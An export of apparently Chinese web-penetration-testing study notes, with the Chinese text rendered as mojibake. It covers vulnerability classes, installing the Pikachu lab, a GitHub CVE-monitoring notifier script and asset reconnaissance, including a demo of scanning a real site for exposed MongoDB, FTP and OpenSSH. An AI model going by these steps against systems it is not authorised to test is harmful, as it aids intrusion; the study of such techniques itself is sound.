title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h4><p>è¿œç¨‹æ”»å‡»è€…åˆ©ç”¨æ¼æ´å¯åœ¨æœªç»ä»»ä½•èº«ä»½éªŒè¯çš„æœåŠ¡å™¨ä¸»æœºä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œè¢«æ”»å‡»è€…é—´æ¥æ§åˆ¶æœåŠ¡å™¨</p><h4 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h4><ul><li>ä»£ç æ‰§è¡Œæ¼æ´é€ æˆçš„åŸç†æ˜¯ç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤ï¼Œå¯èƒ½ä¼šå…è®¸æ”»å‡»è€…é€šè¿‡æ”¹å˜ $PATH æˆ–ç¨‹åºæ‰§è¡Œç¯å¢ƒçš„å…¶ä»–æ–¹é¢æ¥æ‰§è¡Œä¸€ä¸ªæ¶æ„æ„é€ çš„ä»£ç ã€‚é€ æˆä»£ç æ‰§è¡Œç›¸å…³çš„å‡½æ•°åˆ†åˆ«æ˜¯ï¼ševalã€assertå‡½æ•°</li><li>æš´éœ²æœåŠ¡å™¨ä¿¡æ¯</li><li>æœ¨é©¬æ¤å…¥</li><li>æ•æ„Ÿæ–‡ä»¶æš´éœ²</li><li>å¯èƒ½å‡çº§ä¸ºå‘½ä»¤æ‰§è¡Œ</li></ul><h4 id="é€»è¾‘æ¼æ´"><a href="#é€»è¾‘æ¼æ´" class="headerlink" title="é€»è¾‘æ¼æ´"></a>é€»è¾‘æ¼æ´</h4><ul><li>å¤§é‡æ•æ„Ÿæ•°æ®æ³„éœ²ï¼Œè¶Šæƒè®¿é—®ï¼Œè¶Šæƒé‡ç½®å£ä»¤</li><li>å•†å“ä½ä»·æ”¯ä»˜ç»æµæŸå¤±ï¼Œå•†å“/äº§å“é‡‘é¢ã€æ•°é‡ç¯¡æ”¹ç­‰</li><li>æ´»åŠ¨è¢«æ¶æ„åˆ·å–ï¼Œå¡/åˆ¸é‡å¤é¢†å–ï¼Œæ¡ä»¶ç«äº‰ç­‰</li><li>æºæ¶æ„æŸè€—ï¼Œæ”¯ä»˜æ¥å£ã€çŸ­ä¿¡/é‚®ä»¶æ¥æ”¶</li></ul><h4 id="æœªæˆæƒè®¿é—®"><a href="#æœªæˆæƒè®¿é—®" class="headerlink" title="æœªæˆæƒè®¿é—®"></a>æœªæˆæƒè®¿é—®</h4><p>æ•æ„Ÿä¿¡æ¯æ³„éœ²</p><h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><ul><li>ç»§æ‰¿WebæœåŠ¡ç¨‹åºçš„æƒé™å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å†™æ–‡ä»¶</li><li>åå¼¹shell</li><li>æ§åˆ¶æ•´ä¸ªç½‘ç«™ç”šè‡³æ§åˆ¶æœåŠ¡å™¨</li><li>è¿›ä¸€æ­¥å†…ç½‘æ¸—é€</li></ul><h4 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h4><p>æ”»å‡»è€…é€šè¿‡è®¿é—®ç½‘ç«™æŸä¸€ç›®å½•æ—¶ï¼Œè¯¥ç›®å½•æ²¡æœ‰é»˜è®¤é¦–é¡µæ–‡ä»¶æˆ–æ²¡æœ‰æ­£ç¡®è®¾ç½®é»˜è®¤é¦–é¡µæ–‡ä»¶ï¼Œå°†ä¼šæŠŠæ•´ä¸ªç›®å½•ç»“æ„åˆ—å‡ºæ¥ï¼Œå°†ç½‘ç«™ç»“æ„å®Œå…¨æš´éœ²ç»™æ”»å‡»è€…ï¼› æ”»å‡»è€…å¯èƒ½é€šè¿‡æµè§ˆç›®å½•ç»“æ„ï¼Œè®¿é—®åˆ°æŸäº›éšç§˜æ–‡ä»¶ï¼ˆå¦‚PHPINFOæ–‡ä»¶ã€æœåŠ¡å™¨æ¢é’ˆæ–‡ä»¶ã€ç½‘ç«™ç®¡ç†å‘˜åå°è®¿é—®åœ°å€ã€æ•°æ®åº“è¿æ¥æ–‡ä»¶ç­‰ï¼‰</p><h3 id="ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´ç­‰çº§åˆ’åˆ†"><a href="#ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´ç­‰çº§åˆ’åˆ†" class="headerlink" title="ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´ç­‰çº§åˆ’åˆ†"></a>ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´ç­‰çº§åˆ’åˆ†</h3><p>é«˜å±æ¼æ´ï¼šä»£ç æ‰§è¡Œã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€å‘½ä»¤æ‰§è¡Œã€SQLæ³¨å…¥ã€æœªæˆæƒè®¿é—®</p><p>ä¸­å±æ¼æ´ï¼šé€»è¾‘å®‰å…¨ã€ååºåˆ—åŒ–</p><p>ä½å±æ¼æ´ï¼šç›®å½•éå†ã€XSSè·¨ç«™ã€æ–‡ä»¶è¯»å–</p><h3 id="ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´é‡ç‚¹å†…å®¹"><a href="#ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´é‡ç‚¹å†…å®¹" class="headerlink" title="ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´é‡ç‚¹å†…å®¹"></a>ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´é‡ç‚¹å†…å®¹</h3><p>CTFï¼šSQLæ³¨å…¥ã€æ–‡ä»¶ä¸Šä¼ ã€ååºåˆ—åŒ–ã€ä»£ç æ‰§è¡Œ</p><p>SRCï¼šå›¾ç‰‡ä¸Šæ¼æ´éƒ½èƒ½å‡ºç°ï¼Œé€»è¾‘å®‰å…¨å‡ºç°æ¯”è¾ƒå¤š</p><p>çº¢è“å¯¹æŠ—ï¼šæ¶‰åŠçš„é«˜å±æ¼æ´ï¼Œæ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€ä»£ç æ‰§è¡Œã€å‘½ä»¤æ‰§è¡Œ</p><h3 id="ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å½¢åŠ¿é—®é¢˜"><a href="#ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å½¢åŠ¿é—®é¢˜" class="headerlink" title="ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å½¢åŠ¿é—®é¢˜"></a>ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å½¢åŠ¿é—®é¢˜</h3><p>æ‰¾ä¸åˆ°æ¼æ´æ˜¯å› ä¸ºï¼šä¿¡æ¯æ”¶é›†æ²¡åšå¥½ï¼Œè‡ªå·±å¯¹æ¼æ´çš„ç†è§£ä¸å¤Ÿ</p><h3 id="pikachué¶åœºå®‰è£…"><a href="#pikachué¶åœºå®‰è£…" class="headerlink" title="pikachué¶åœºå®‰è£…"></a>pikachué¶åœºå®‰è£…</h3><h4 id="ä¸‹è½½æºç "><a href="#ä¸‹è½½æºç " class="headerlink" title="ä¸‹è½½æºç "></a>ä¸‹è½½æºç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zhuifengshaonianhanlu/pikachu</span><br></pre></td></tr></table></figure><h4 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102663.png" alt="image-20210823155333791"></p><h4 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102285.png" alt="image-20210823155556965"></p><h4 id="åˆå§‹åŒ–æˆåŠŸ"><a href="#åˆå§‹åŒ–æˆåŠŸ" class="headerlink" title="åˆå§‹åŒ–æˆåŠŸ"></a>åˆå§‹åŒ–æˆåŠŸ</h4><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102798.png" alt="image-20210823155631011" style="zoom: 67%;" /><h3 id="æ¶‰åŠèµ„æº"><a href="#æ¶‰åŠèµ„æº" class="headerlink" title="æ¶‰åŠèµ„æº"></a>æ¶‰åŠèµ„æº</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zhuifengshaonianhanlu/pikachu</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10ä¿¡æ¯æ”¶é›†-èµ„äº§ç›‘æ§æ‹“å±•</title>
      <link href="/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/"/>
      <url>/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="Githubç›‘æ§"><a href="#Githubç›‘æ§" class="headerlink" title="Githubç›‘æ§"></a>Githubç›‘æ§</h3><p>ä¾¿äºæ”¶é›†æ•´ç†æœ€æ–° exp æˆ– poc<br>ä¾¿äºå‘ç°ç›¸å…³æµ‹è¯•ç›®æ ‡çš„èµ„äº§</p><h3 id="å„ç§å­åŸŸåæŸ¥è¯¢"><a href="#å„ç§å­åŸŸåæŸ¥è¯¢" class="headerlink" title="å„ç§å­åŸŸåæŸ¥è¯¢"></a>å„ç§å­åŸŸåæŸ¥è¯¢</h3><h3 id="DNS-å¤‡æ¡ˆ-è¯ä¹¦"><a href="#DNS-å¤‡æ¡ˆ-è¯ä¹¦" class="headerlink" title="DNS,å¤‡æ¡ˆ,è¯ä¹¦"></a>DNS,å¤‡æ¡ˆ,è¯ä¹¦</h3><h3 id="å…¨çƒèŠ‚ç‚¹è¯·æ±‚-cdn"><a href="#å…¨çƒèŠ‚ç‚¹è¯·æ±‚-cdn" class="headerlink" title="å…¨çƒèŠ‚ç‚¹è¯·æ±‚ cdn"></a>å…¨çƒèŠ‚ç‚¹è¯·æ±‚ cdn</h3><p>æšä¸¾çˆ†ç ´æˆ–è§£æå­åŸŸåå¯¹åº”<br>ä¾¿äºå‘ç°ç®¡ç†å‘˜ç›¸å…³çš„æ³¨å†Œä¿¡æ¯</p><h3 id="é»‘æš—å¼•æ“ç›¸å…³æœç´¢"><a href="#é»‘æš—å¼•æ“ç›¸å…³æœç´¢" class="headerlink" title="é»‘æš—å¼•æ“ç›¸å…³æœç´¢"></a>é»‘æš—å¼•æ“ç›¸å…³æœç´¢</h3><p>fofaï¼Œshodanï¼Œzoomeye</p><h3 id="å¾®ä¿¡å…¬ä¼—å·æ¥å£è·å–"><a href="#å¾®ä¿¡å…¬ä¼—å·æ¥å£è·å–" class="headerlink" title="å¾®ä¿¡å…¬ä¼—å·æ¥å£è·å–"></a>å¾®ä¿¡å…¬ä¼—å·æ¥å£è·å–</h3><h3 id="å†…éƒ¨ç¾¤å†…éƒ¨åº”ç”¨å†…éƒ¨æ¥å£"><a href="#å†…éƒ¨ç¾¤å†…éƒ¨åº”ç”¨å†…éƒ¨æ¥å£" class="headerlink" title="å†…éƒ¨ç¾¤å†…éƒ¨åº”ç”¨å†…éƒ¨æ¥å£"></a>å†…éƒ¨ç¾¤å†…éƒ¨åº”ç”¨å†…éƒ¨æ¥å£</h3><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102475.png" alt="f39dd3590e0946f8820476b85d7f8ec6.png" style="zoom:80%;" /><h3 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h3><p>ç›‘æ§æœ€æ–°çš„EXPå‘å¸ƒåŠå…¶ä»–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"># Title: wechat push CVE-2020</span><br><span class="line"># Date: 2020-5-9</span><br><span class="line"># Exploit Author: weixiao9188</span><br><span class="line"># Version: 4.0</span><br><span class="line"># Tested on: Linux,windows</span><br><span class="line"># coding:UTF-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import pandas as pd</span><br><span class="line">time_sleep = 20 #æ¯éš”20ç§’çˆ¬å–ä¸€æ¬¡</span><br><span class="line">while(True):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;&#125;</span><br><span class="line">    #åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br><span class="line">    datas = []</span><br><span class="line">    response1=None</span><br><span class="line">    response2=None</span><br><span class="line">    if os.path.exists(&quot;olddata.csv&quot;):</span><br><span class="line">        #å¦‚æœæ–‡ä»¶å­˜åœ¨åˆ™æ¯æ¬¡çˆ¬å–10ä¸ª</span><br><span class="line">        df = pd.read_csv(&quot;olddata.csv&quot;, header=None)</span><br><span class="line">        datas = df.where(df.notnull(),None).values.tolist()#å°†æå–å‡ºæ¥çš„æ•°æ®ä¸­çš„nanè½¬åŒ–ä¸ºNone</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;per_page=10&quot;,</span><br><span class="line">                                 headers=headers)</span><br><span class="line">        response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=phpcms&amp;ssort=updated&amp;per_page=10&quot;,</span><br><span class="line">                                 headers=headers)</span><br><span class="line">    else:</span><br><span class="line">        #ä¸å­˜åœ¨çˆ¬å–å…¨éƒ¨</span><br><span class="line">        datas = []</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc&quot;,headers=headers)</span><br><span class="line">        response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc&quot;,headers=headers)</span><br><span class="line"></span><br><span class="line">    data1 = json.loads(response1.text)</span><br><span class="line">    data2 = json.loads(response2.text)</span><br><span class="line">    for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]:</span><br><span class="line">        for i in j:</span><br><span class="line">            s = &#123;&quot;name&quot;:i[&#x27;name&#x27;],&quot;html&quot;:i[&#x27;html_url&#x27;],&quot;description&quot;:i[&#x27;description&#x27;]&#125;</span><br><span class="line">            s1 =[i[&#x27;name&#x27;],i[&#x27;html_url&#x27;],i[&#x27;description&#x27;]]</span><br><span class="line">            if s1 not in datas:</span><br><span class="line">                #print(s1)</span><br><span class="line">                #print(datas)</span><br><span class="line">                params = &#123;</span><br><span class="line">                     &quot;text&quot;:s[&quot;name&quot;],</span><br><span class="line">                    &quot;desp&quot;:&quot; é“¾æ¥:&quot;+str(s[&quot;html&quot;])+&quot;\nç®€ä»‹&quot;+str(s[&quot;description&quot;])</span><br><span class="line">                &#125;</span><br><span class="line">                print(&quot;å½“å‰æ¨é€ä¸º&quot;+str(s)+&quot;\n&quot;)</span><br><span class="line">                print(params)</span><br><span class="line">                requests.get(&quot;https://sc.ftqq.com/xxxx.send&quot;,params=params,timeout=10)</span><br><span class="line">                #time.sleep(1)#ä»¥é˜²æ¨é€å¤ªçŒ›#ï¼Œverify=False</span><br><span class="line">                print(&quot;æ¨é€å®Œæˆ!&quot;)</span><br><span class="line">                datas.append(s1)</span><br><span class="line">            else:</span><br><span class="line">                pass</span><br><span class="line">                #print(&quot;æ•°æ®å·²å¤„åœ¨!&quot;)</span><br><span class="line">    pd.DataFrame(datas).to_csv(&quot;olddata.csv&quot;,header=None,index=None)</span><br><span class="line">    time.sleep(time_sleep)</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…pandas"><a href="#å®‰è£…pandas" class="headerlink" title="å®‰è£…pandas"></a>å®‰è£…pandas</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101102.png" alt="image-20210820151850943"></p><h4 id="Serveré…±è®¾ç½®"><a href="#Serveré…±è®¾ç½®" class="headerlink" title="Serveré…±è®¾ç½®"></a>Serveré…±è®¾ç½®</h4><p>æ‰«ç ç™»å½•è·å–è‡ªå·±çš„SendKeyï¼Œä¹‹åä¿®æ”¹åˆ°ä»£ç ä¸­xxxxä¸ºSendKeyå€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sctapi.ftqq.com/xxxx.send</span><br></pre></td></tr></table></figure><h4 id="æœ€åç»“æœ"><a href="#æœ€åç»“æœ" class="headerlink" title="æœ€åç»“æœ"></a>æœ€åç»“æœ</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101137.png" alt="image-20210820154200037"></p><h4 id="é»‘æš—å¼•æ“å®ç°åŸŸåç«¯å£ç­‰æ”¶é›†"><a href="#é»‘æš—å¼•æ“å®ç°åŸŸåç«¯å£ç­‰æ”¶é›†" class="headerlink" title="é»‘æš—å¼•æ“å®ç°åŸŸåç«¯å£ç­‰æ”¶é›†"></a>é»‘æš—å¼•æ“å®ç°åŸŸåç«¯å£ç­‰æ”¶é›†</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101466.png" alt="image-20210921110147377"></p><h4 id="å…¨è‡ªåŠ¨åŸŸåæ”¶é›†æšä¸¾ä¼˜ç§€è„šæœ¬ä½¿ç”¨"><a href="#å…¨è‡ªåŠ¨åŸŸåæ”¶é›†æšä¸¾ä¼˜ç§€è„šæœ¬ä½¿ç”¨" class="headerlink" title="å…¨è‡ªåŠ¨åŸŸåæ”¶é›†æšä¸¾ä¼˜ç§€è„šæœ¬ä½¿ç”¨"></a>å…¨è‡ªåŠ¨åŸŸåæ”¶é›†æšä¸¾ä¼˜ç§€è„šæœ¬ä½¿ç”¨</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä»¥xxxxä¸ºä¾‹ï¼Œä»æ ‡é¢˜ï¼ŒåŸŸåç­‰æ”¶é›†</span><br><span class="line">ä»¥xxxxä¸ºä¾‹ï¼Œå…¨è‡ªåŠ¨è„šæœ¬ä½¿ç”¨æ”¶é›†</span><br></pre></td></tr></table></figure><h5 id="teemo"><a href="#teemo" class="headerlink" title="teemo"></a>teemo</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip.exe install requirements.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101119.png" alt="image-20210820160708603"></p><h2 id="æ¶‰åŠèµ„æº"><a href="#æ¶‰åŠèµ„æº" class="headerlink" title="æ¶‰åŠèµ„æº"></a>æ¶‰åŠèµ„æº</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh/</span><br><span class="line">https://dnsdb.io/</span><br><span class="line">https://sc.ftqq.com/3.versionhttps://tools.ipip.net/cdn.php</span><br><span class="line">https://github.com/bit4woo/teemo</span><br><span class="line">https://securitytrails.com/domain/www.baidu.com/history/a</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>09ä¿¡æ¯æ”¶é›†--APPåŠå…¶ä»–èµ„äº§ç­‰</title>
      <link href="/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/"/>
      <url>/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨å®‰å…¨æµ‹è¯•ä¸­ï¼Œè‹¥ WEB æ— æ³•å–å¾—è¿›å±•æˆ–æ—  WEB çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ© APP æˆ–å…¶ä»–èµ„äº§åœ¨è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œä»è€Œå¼€å±•åç»­æ¸—é€ï¼Œé‚£ä¹ˆå…¶ä¸­çš„ä¿¡æ¯æ”¶é›†å°±å°¤ä¸ºé‡è¦ã€‚</p><h3 id="APPæå–ä¸€é”®åç¼–è¯‘æå–"><a href="#APPæå–ä¸€é”®åç¼–è¯‘æå–" class="headerlink" title="APPæå–ä¸€é”®åç¼–è¯‘æå–"></a>APPæå–ä¸€é”®åç¼–è¯‘æå–</h3><h3 id="APPæŠ“æ•°æ®åŒ…è¿›è¡Œå·¥å…·é…åˆ"><a href="#APPæŠ“æ•°æ®åŒ…è¿›è¡Œå·¥å…·é…åˆ" class="headerlink" title="APPæŠ“æ•°æ®åŒ…è¿›è¡Œå·¥å…·é…åˆ"></a>APPæŠ“æ•°æ®åŒ…è¿›è¡Œå·¥å…·é…åˆ</h3><h3 id="å„ç§ç¬¬ä¸‰æ–¹åº”ç”¨ç›¸å…³æ¢é’ˆæŠ€æœ¯"><a href="#å„ç§ç¬¬ä¸‰æ–¹åº”ç”¨ç›¸å…³æ¢é’ˆæŠ€æœ¯" class="headerlink" title="å„ç§ç¬¬ä¸‰æ–¹åº”ç”¨ç›¸å…³æ¢é’ˆæŠ€æœ¯"></a>å„ç§ç¬¬ä¸‰æ–¹åº”ç”¨ç›¸å…³æ¢é’ˆæŠ€æœ¯</h3><h3 id="å„ç§æœåŠ¡æ¥å£ä¿¡æ¯ç›¸å…³æ¢é’ˆæŠ€æœ¯"><a href="#å„ç§æœåŠ¡æ¥å£ä¿¡æ¯ç›¸å…³æ¢é’ˆæŠ€æœ¯" class="headerlink" title="å„ç§æœåŠ¡æ¥å£ä¿¡æ¯ç›¸å…³æ¢é’ˆæŠ€æœ¯"></a>å„ç§æœåŠ¡æ¥å£ä¿¡æ¯ç›¸å…³æ¢é’ˆæŠ€æœ¯</h3><h3 id="APPæå–åŠæŠ“åŒ…åŠåç»­é…åˆ"><a href="#APPæå–åŠæŠ“åŒ…åŠåç»­é…åˆ" class="headerlink" title="APPæå–åŠæŠ“åŒ…åŠåç»­é…åˆ"></a>APPæå–åŠæŠ“åŒ…åŠåç»­é…åˆ</h3><h4 id="æŸ-APK-ä¸€é”®æå–åç¼–è¯‘"><a href="#æŸ-APK-ä¸€é”®æå–åç¼–è¯‘" class="headerlink" title="æŸ APK ä¸€é”®æå–åç¼–è¯‘"></a>æŸ APK ä¸€é”®æå–åç¼–è¯‘</h4><p>åˆ©ç”¨ burp å†å²æŠ“æ›´å¤š URL<br>æŸ IP æ—  WEB æ¡†æ¶ä¸‹çš„ç¬¬ä¸‰æ–¹æµ‹è¯•</p><h3 id="æŸIPæ— webæ¡†æ¶ä¸‹çš„ç¬¬ä¸‰æ–¹æµ‹è¯•"><a href="#æŸIPæ— webæ¡†æ¶ä¸‹çš„ç¬¬ä¸‰æ–¹æµ‹è¯•" class="headerlink" title="æŸIPæ— webæ¡†æ¶ä¸‹çš„ç¬¬ä¸‰æ–¹æµ‹è¯•"></a>æŸIPæ— webæ¡†æ¶ä¸‹çš„ç¬¬ä¸‰æ–¹æµ‹è¯•</h3><p>å„ç§ç«¯å£ä¸€é¡¿ä¹±æ‰«-æ€è·¯</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057931.png" alt="image-20210819191434451"></p><p>shodan</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057963.png" alt="image-20210819185717825"></p><p> ç«¯å£8332ï¼šå‘ç°å‡ºç°ç™»å½•æ¡†</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058339.png" alt="image-20210921105821267"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057979.png" alt="image-20210819190135417"></p><p>å‘ç°RomPager ï¼Œç™¾åº¦ä¸€ä¸‹<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058169.png" alt="image-20210921105829091"></p><p>628ç«¯å£å‘ç°è¿™ä¸ª</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057997.png" alt="image-20210819190256755"></p><p>fofaå‘ç°</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058593.png" alt="image-20210921105838530"></p><p>å„ç§æ¥å£ä¸€é¡¿ä¹±æ‰«-æ€è·¯</p><p>æ¥å£éƒ¨åˆ†ä¸€é¡¿æµ‹è¯•-æ€è·¯</p><p>æ—ç«™æŸ¥è¯¢</p><p>Cæ®µæŸ¥è¯¢</p><p>ç±»ä¼¼åŸŸåç«™ç‚¹-å¤‡æ¡ˆæŸ¥è¯¢ï¼šæ‰¾ç½‘å€ï¼Œå†pingå‡ºipåœ°å€ï¼Œå†ç”¨é»‘æš—å¼•æ“æœç´¢å†…å®¹</p><h3 id="æ¼”ç¤ºï¼šæŸä¼ é”€ç½‘ç«™ä¿¡æ¯æ”¶é›†"><a href="#æ¼”ç¤ºï¼šæŸä¼ é”€ç½‘ç«™ä¿¡æ¯æ”¶é›†" class="headerlink" title="æ¼”ç¤ºï¼šæŸä¼ é”€ç½‘ç«™ä¿¡æ¯æ”¶é›†"></a>æ¼”ç¤ºï¼šæŸä¼ é”€ç½‘ç«™ä¿¡æ¯æ”¶é›†</h3><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057562.png" alt="image-20210819190620312"></p><p>fofaæœç´¢</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057593.png" alt="image-20210819190833802"></p><p>å‘ç°MongoDB-æ•°æ®åº“ï¼Œå­˜åœ¨çˆ†ç ´å¯èƒ½</p><p>å‘ç°FTPæœåŠ¡</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057790.png" alt="image-20210819191031025"></p><p>å‘ç°OpenSSH7.6</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058583.png" alt="image-20210921105849528"></p><p>ç™¾åº¦å‘ç°å­˜åœ¨ç”¨æˆ·æšä¸¾æ¼æ´</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058738.png" alt="image-20210921105856663"></p><p>è·å–åˆ°ip</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057320.png" 